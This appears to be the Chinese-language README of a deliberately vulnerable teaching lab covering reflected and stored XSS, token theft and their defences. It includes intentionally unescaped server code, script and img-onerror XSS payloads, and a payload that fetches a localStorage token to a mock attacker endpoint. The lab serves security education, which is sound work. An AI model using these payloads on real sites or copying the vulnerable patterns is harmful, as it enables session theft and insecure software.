# 🔐 Security Lab - 网络安全攻击案例学习平台

## ⚠️ 免责声明

本项目仅供学习和研究目的，请勿将所学知识用于非法用途！

## 🛠️ 技术栈

- **后端**: Express + Node.js
- **前端**: 原生 HTML（清晰易懂）
- **包管理**: pnpm (monorepo)
- **数据存储**: 内存存储 + localStorage

## 📦 项目结构

```
security-lab/
├── packages/
│   ├── server/
│   │   ├── src/
│   │   │   ├── index.js
│   │   │   └── routes/
│   │   │       ├── search.js    # 反射型 XSS
│   │   │       ├── comment.js   # 存储型 XSS
│   │   │       └── steal.js     # Token 窃取
│   │   └── client/
│   │       └── xss/
│   │           ├── index.html   # 实验首页
│   │           ├── search.html  # 反射型 XSS
│   │           ├── comment.html # 存储型 XSS
│   │           └── steal.html   # Token 窃取
│   └── lab/                     # Vue3 前端 (SQL注入/CSRF)
├── package.json
└── pnpm-workspace.yaml
```

## 🚀 快速开始

```bash
# 安装依赖
pnpm install

# 启动服务
pnpm dev:server

# 访问 http://localhost:4000
```

---

# 📚 XSS Lab 实验指南

## 1. 什么是 XSS

XSS (Cross-Site Scripting) 是一种代码注入攻击。攻击者通过在网页中注入恶意脚本，当其他用户浏览该页面时，脚本会在用户浏览器中执行。

| 类型 | 特点 | 危害程度 |
|------|------|----------|
| 反射型 | 恶意脚本来自 URL，需诱导点击 | ⭐⭐ |
| 存储型 | 恶意脚本存储在服务器，所有人中招 | ⭐⭐⭐⭐ |
| DOM型 | 漏洞在客户端，不经过服务器 | ⭐⭐⭐ |

---

## 2. 反射型 XSS 演示

### 场景
搜索功能：`/api/search/unsafe?q=xxx`，后端把 `q` 原样返回给页面。

### 有漏洞的代码
```javascript
// ❌ 直接拼接用户输入
res.send(`
  <h1>搜索结果</h1>
  <div>你搜索的是：${q}</div>
`)
```

### 攻击方式
```
/api/search/unsafe?q=<script>alert('XSS')</script>
```

### 验证
- 页面弹窗 ✓
- 控制台打印 ✓
- DOM 被篡改 ✓

---

## 3. 存储型 XSS 演示

### 场景
评论系统：用户提交评论 → 存储到数据库 → 其他用户访问时渲染

### 有漏洞的数据流
```
用户输入
   ↓
数据库（未过滤）
   ↓
页面 innerHTML 渲染  ← 漏洞点！
```

### 攻击 Payload
```html
<script>console.log('stored xss')</script>

<img src=x onerror="alert('stored xss')">
```

### 危害
- 攻击代码被"存储"
- 所有访问页面的人都会中招
- 危害 > 反射型 XSS

---

## 4. XSS 窃取凭证

### 前置条件
用户登录后 Token 存储在 localStorage：
```javascript
localStorage.setItem('token', 'fake-jwt')
```

### 攻击代码
```html
<img src=x onerror="fetch('/api/steal?token='+localStorage.getItem('token'))">
```

### 攻击者服务器
```javascript
// 只需记录收到的 token
console.log('token received:', req.query.token)
```

### 核心问题
- localStorage ≠ 安全
- XSS + JWT = 灾难
- 前端安全边界在哪里？

---

## 5. 防御方案

### 5.1 输出转义（最核心）
```javascript
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;')
}
```

### 5.2 不用 innerHTML
```javascript
// ❌ 危险
element.innerHTML = userInput

// ✅ 安全
element.textContent = userInput
```

### 5.3 CSP 策略
```
Content-Security-Policy: script-src 'self'
```

### 5.4 HttpOnly Cookie
```javascript
res.cookie('token', jwt, {
  httpOnly: true,  // JS 无法读取
  secure: true,
  sameSite: 'strict'
})
```

---

## 🔗 API 接口

| 接口 | 方法 | 说明 |
|------|------|------|
| `/api/search/unsafe?q=xxx` | GET | 有漏洞的搜索 |
| `/api/search/safe?q=xxx` | GET | 安全的搜索 |
| `/api/comment` | POST | 发表评论 |
| `/api/comment/list/unsafe` | GET | 获取评论(不转义) |
| `/api/comment/list/safe` | GET | 获取评论(转义) |
| `/api/steal?token=xxx` | GET | 模拟攻击者服务器 |
| `/api/steal/list` | GET | 查看窃取的 token |
